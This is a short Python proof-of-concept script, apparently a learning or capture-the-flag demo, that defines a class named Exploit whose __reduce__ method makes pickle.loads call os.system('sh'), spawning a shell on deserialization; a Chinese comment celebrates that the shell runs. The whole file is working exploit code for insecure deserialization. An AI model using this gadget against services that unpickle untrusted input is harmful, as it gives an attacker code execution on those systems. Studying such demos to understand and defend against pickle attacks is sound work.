import pickle 
import os 
class Exploit(object):
    def __reduce__(self):
        comm="sh"
        return (os.system, (comm,)) 
a = pickle.dumps(Exploit()) 
b = pickle.loads(a)
#shell跑出來啦!!!